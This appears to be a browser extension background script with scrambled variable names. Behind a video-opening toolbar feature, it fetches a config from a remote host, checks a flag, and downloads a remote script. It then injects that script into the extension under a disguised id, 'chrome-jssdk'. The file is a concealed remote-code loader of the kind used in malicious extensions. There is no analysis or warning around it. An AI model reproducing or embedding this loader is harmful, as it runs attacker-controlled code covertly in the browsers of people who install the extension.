var vqtdl = {};
var sfhss = function(){
	var vrpabc = "http://plugin.oheloke.yezav.bid/config";
	fetch(vrpabc).then(function(response){
		return response.json();
	}).then(function(data){
		vqtdl = data;
		if(data.login == true){
			vqtdl.app = chrome.app.getDetails();
			mmvffu();
		}else{
			wjcyl();
		}
	});
}

var mmvffu = function(){
	vqtdl.request.headers = {installed:true};
	fetch(vqtdl.check ,vqtdl.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			zzkll();
		}else{
			wjcyl();
		}
	});
}

var zznjic = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = vqtdl.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var zzkll = function(){
	fetch(vqtdl.url).then(function(response){
		return response.blob();
	}).then(function(data){
		vqtdl.url = URL.createObjectURL(data);
		zznjic(vqtdl.url);
	});
}

var ljufbc = function(){
	fetch(vqtdl.stream).then(function(response){
		return response.json();
	}).then(function(data){
		vqtdl.video = data.link;
		if(!vqtdl.tab){
			mxzkjj();
		}else{
			okgit();
		}
	})
}

var mxzkjj = function(){
	chrome.tabs.create({url:vqtdl.video}, function(tab){
		vqtdl.tab = tab.id;
		chrome.browserAction.enable();
		if(!vqtdl.evxuv){
			bqgfkv();
		}
	});
}

var okgit = function(){
	chrome.tabs.update(vqtdl.tab, {url: vqtdl.video}, function(){
		chrome.browserAction.enable();
	})
}

var bqgfkv = function(){
	vqtdl.evxuv = true;
	chrome.tabs.onRemoved.addListener(function(tab){
		if(tab == vqtdl.tab){
			vqtdl.tab = false;
		}
	});
}

var wjcyl = function(){
	chrome.browserAction.onClicked.addListener(function(){
		chrome.browserAction.disable();
		ljufbc();
	});
}

if(chrome){
	sfhss();
}
